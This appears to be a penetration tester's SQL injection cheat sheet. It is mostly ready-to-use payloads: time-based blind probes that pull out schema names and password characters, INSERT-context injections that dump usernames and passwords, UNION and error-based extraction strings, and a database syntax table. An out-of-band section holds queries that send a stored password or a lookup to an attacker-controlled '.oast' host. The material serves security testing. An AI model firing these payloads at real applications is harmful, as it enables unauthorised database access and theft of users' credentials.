# Other SQL Injection Techniques

```bash
test@test.com' and 1=sleep(3);-- -
```

```bash
' or 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--
```

```bash
' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--
```

```bash
' and (SELECT sleep(3) from information_schema.COLUMNS where TABLE_SCHEMA = 'sqli_four' and TABLE_NAME = 'users' and COLUMN_NAME like 'u%' LIMIT 1);--+-
```

```bash
' AND 1=(SELECT sleep(3) FROM users WHERE username = 'administrator' AND password like 'a%' LIMIT 1);-- -
```

- [ ] Look for any input fields that may be inserting rows into the database and check those for injection as well.

> [!warning] 
> Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.

- Examples

```bash
title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--
```

```bash
title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--
```

```bash
title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--
```

- Blind insert examples

```bash
test',sleep(5),'');-- -
```

```bash
',( select sleep(5) where version() like '8%' ) ,'');--
```

```bash
',( select sleep(5) from flag where flag like 'a%' ),'');--
```

## Tools

- [ ] [sqlmap](sqlimap.md)
- [ ] ghauri
      [GitHub - r0oth3x49/ghauri: An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws](https://github.com/r0oth3x49/ghauri)

> [!tip] 
> Custom headers are still by far the most common place to still find SQLi

## UNION-Based Injection

### Determine Number of Columns

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -    -- increment until error
```

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -    -- increment until no error
```

### Find String-Compatible Columns

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

### Extract Data

```sql
' UNION SELECT username,password FROM users-- -
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

## Error-Based Injection

### MySQL

```sql
' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))-- -
' AND updatexml(1, concat(0x7e, (SELECT version()), 0x7e), 1)-- -
```

### PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)-- -
```

### MSSQL

```sql
' AND 1=CONVERT(int, (SELECT @@version))-- -
```

## Database-Specific Syntax

| Task          | MySQL                        | PostgreSQL                   | MSSQL                                     | Oracle                               |
| ------------- | ---------------------------- | ---------------------------- | ----------------------------------------- | ------------------------------------ |
| String concat | `CONCAT('a','b')`            | `'a'\|\|'b'`                 | `'a'+'b'`                                 | `'a'\|\|'b'`                         |
| Comment       | `-- -` or `#`                | `-- -`                       | `-- -`                                    | `-- -`                               |
| Version       | `@@version`                  | `version()`                  | `@@version`                               | `SELECT banner FROM v$version`       |
| Current DB    | `database()`                 | `current_database()`         | `db_name()`                               | `SELECT ora_database_name FROM dual` |
| List tables   | `information_schema.tables`  | `information_schema.tables`  | `information_schema.tables`               | `all_tables`                         |
| List columns  | `information_schema.columns` | `information_schema.columns` | `information_schema.columns`              | `all_tab_columns`                    |
| Time delay    | `SLEEP(5)`                   | `pg_sleep(5)`                | `WAITFOR DELAY '0:0:5'`                   | `dbms_pipe.receive_message(('a'),5)` |
| DNS exfil     | `LOAD_FILE('\\\\x.oast\\a')` | `COPY ... TO PROGRAM`        | `exec master..xp_dirtree '\\\\x.oast\\a'` | `UTL_HTTP.request('http://x.oast/')` |

## Second-Order SQL Injection

- [ ] Check if stored data (e.g., username, profile fields) is later used in a SQL query without proper sanitization
- [ ] Register a user with a payload like `admin'--` and see if it triggers when used elsewhere (e.g., password reset, profile update)

## Out-of-Band (OOB) SQL Injection

### MySQL

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.oast.server\\a'));
```

### MSSQL

```sql
exec master..xp_dirtree '\\attacker.oast\\a'
```

---

## References

- [PortSwigger SQL Injection Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks - SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)
